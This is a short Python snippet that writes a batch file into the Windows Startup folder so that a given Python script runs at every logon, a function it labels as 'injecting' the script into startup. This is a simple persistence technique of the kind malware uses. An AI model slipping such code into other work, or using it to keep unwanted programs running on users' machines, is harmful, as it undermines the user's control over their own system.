import os

startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

def inject(filepath):
    print("Injecting the script into startup")
    file = open(f"{startup}\\timer.bat", "w")
    file.write(f"@echo off\npy {filepath}")
    file.close()

# path_to_startup = f""